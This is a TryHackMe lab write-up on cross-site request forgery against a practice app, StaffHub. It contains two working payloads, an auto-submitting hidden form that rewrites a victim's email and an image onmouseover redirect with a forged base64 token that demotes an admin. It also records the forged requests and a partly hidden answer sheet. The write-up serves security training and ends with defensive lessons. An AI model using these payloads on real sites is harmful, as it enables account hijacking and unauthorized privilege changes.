# CSRF Introduction (TryHackMe)

- **Path:** Jr Penetration Tester > Web Application Vulnerabilities I
- **Completed:** 2026-10-10 - **Target:** StaffHub @ <ip>:8080 (vhost staffhub.thm); AttackBox <ip>
- Done over VPN: logged in as the victim (user:user) and reproduced the state-changing requests
  the CSRF payloads would trigger.

CSRF = trick an authenticated user's browser into sending a state-changing request to a site where
they are logged in. The browser auto-attaches the session cookie, so if the server does not verify
origin or use an unpredictable token, it treats the forged request as legitimate.

## Answer sheet

| Task | Question | Answer |
|---|---|---|
| 2 | Relationship CSRF abuses | *(find it yourself)* |
| 2 | What the browser auto-includes after login | *(find it yourself)* |
| 3 | Action type required | *(find it yourself)* |
| 4 | Method devs wrongly think prevents CSRF | *(find it yourself)* |
| 4 | Mechanism that protects against CSRF | *(find it yourself)* |
| 5 | Flag, email -> attacker@evilmail.thm | THM{…} |
| 5 | Flag, email -> special@evilmail.thm | THM{…} |
| 6 | Flag, role admin -> staff | THM{…} |
| 6 | Encoding used for the weak token | *(find it yourself)* |

## Why it works
Browsers auto-send cookies to a domain on every request regardless of what page triggered it. If
the app only checks "is there a valid session cookie" and not "did this request originate from my
own page", any site can fire a request on the user's behalf. Three conditions: victim is
authenticated, the action is state-changing, and the app does not verify request origin.
Misconception: POST does NOT protect you. Both GET and POST are forgeable.

## Task 5 - no protection (HTML form CSRF)
update_email.php takes only `email`, no token. Intended attack: host an auto-submitting hidden form
on the AttackBox (/var/www/html, served on :81), victim visits while logged in:
```
<form action="http://staffhub.thm:8080/update_email.php" method="POST" id="attack">
  <input type="hidden" name="email" value="attacker@evilmail.thm"></form>
<script>document.getElementById("attack").submit();</script>
```
Over VPN I just did: POST /update_email.php email=attacker@evilmail.thm (then special@evilmail.thm)
with the logged-in session. Flag shows on dashboard.

## Task 6 - weak/predictable token (image CSRF)
update_role.php requires csrf_token, BUT the token is base64(role). The settings page served
csrf_token=YWRtaW4= which decodes to "admin". Predictable -> forgeable. Intended attack: an image
with onmouseover that redirects to the role-change URL with the forged token:
```
<img src="http://staffhub.thm:8080/one.png"
 onmouseover="window.location='http://staffhub.thm:8080/update_role.php?role=staff&csrf_token=YWRtaW4='">
```
Over VPN: GET /update_role.php?role=staff&csrf_token=YWRtaW4= -> demotes admin to staff. Flag on dashboard.

## Best practices (Task 7)
Focus on state-changing requests; check for a CSRF token; do not trust POST alone; try to replay the
request from an external page; see if auth relies only on the session cookie.

## Lessons
- A CSRF token only helps if it is unique, unpredictable, and tied to the session (cf. the ~117-bit
  loginToken from the Sequencer room). base64(role) is reversible = security theatre.
- Real defences: per-session random anti-CSRF tokens validated server-side, SameSite cookies, and
  checking Origin/Referer on state-changing requests.
- The attack does nothing the logged-in user could not do themselves; it just makes the victim's
  browser do it unknowingly. Reproducing the requests with a logged-in session == the CSRF effect.
